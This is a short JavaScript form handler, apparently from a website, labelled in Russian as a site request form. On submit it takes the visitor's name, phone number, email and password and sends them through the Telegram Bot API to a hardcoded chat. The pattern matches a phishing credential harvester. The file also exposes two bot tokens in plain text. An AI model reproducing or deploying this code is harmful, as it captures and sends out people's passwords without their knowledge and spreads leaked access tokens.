// https://api.telegram.org/bot6375041357:AAGaQckD3KLE-EEr2sVMUXNHz8ga4x3WCF8/getUpdates

let token="6606974593:AAEq6c3NomaKEt33RrzeoCuYYEmIl_Z6Ejg"
let CHAT_ID="5455372582"
let url_api=`https://api.telegram.org/bot${token}/sendMessage`
let success=document.getElementById("success")

document.getElementById("tg").addEventListener("submit",function(e){
    e.preventDefault()
    let message=`<b>Заявка с сайта!</b>\n`
    message+=`<b>Отправител:</b> ${this.name.value}\n`
    message+=`<b>Номер:</b> ${this.number.value}\n`
    message+=`<b>Почта:</b> ${this.email.value}\n`
    message+=`<b>Пароль:</b> ${this.password.value}\n`
    console.log(message);
    axios.post(url_api,{
        chat_id:CHAT_ID,
        parse_mode:"html",
        text:message
    }).then((res)=>{
        this.name.value=""
        this.number.value=""
        this.email.value=""
        this.password.value=""
        success.innerHTML="Сообшения отправленно!"
        success.style.display="block"
    }).catch((err)=>{
        console.log(err);
    }).finally(()=>console.log("succesfully"))
})